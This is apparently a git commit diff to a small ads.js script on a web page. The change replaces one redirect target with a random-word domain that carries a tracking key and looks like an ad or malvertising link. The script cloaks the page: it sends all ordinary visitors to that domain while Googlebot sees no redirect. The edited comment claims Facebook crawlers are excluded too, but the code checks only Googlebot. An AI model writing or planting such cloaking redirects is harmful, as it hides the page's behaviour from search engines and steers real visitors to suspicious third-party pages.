14e26d4af53f9f83c7747a2b68a16eb6111b6c70
rabb69087-rgb <rabb69087@gmail.com>
2026-09-20 21:49:45 +0600

    Update redirect URL for normal users

--- ads.js
+++ ads.js
@@ -1,7 +1,7 @@
-// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebot , facebookexternalhit , Facebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://faatv247.blogspot.com/2026/09/fight.html";
+  window.location.href = "https://leashembittercubicle.com/ii65urqi?key=cf2ac7ba3b1c34f2d71eff2472e4a347";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
